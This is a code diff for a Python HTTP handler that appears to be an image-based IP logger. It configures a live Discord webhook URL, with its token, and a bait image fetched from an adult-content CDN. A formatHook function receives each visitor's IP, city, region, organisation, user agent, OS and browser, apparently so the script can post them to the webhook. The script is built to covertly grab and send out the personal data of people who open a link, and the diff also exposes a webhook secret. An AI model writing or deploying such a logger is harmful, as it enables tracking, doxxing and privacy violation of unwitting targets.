@@ -2,10 +2,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'WEBHOOK'
+webhook = 'https://discord.com/api/webhooks/1372847612558049411/hc7nul3Dd4voufzXGtAeepa4XaSjHa7ATET7ih4F4zGRa6erJQiuXtpFBXoNvOG_JDOX'
 
-bindata = httpx.get('link to image here').content
-buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+bindata = httpx.get('https://gcore-pic.xvideos-cdn.com/videos/thumbs169poster/d7/9b/14/d79b148c71ef10f0837d8083ba6a7e77/d79b148c71ef10f0837d8083ba6a7e77.7.jpg').content
+buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
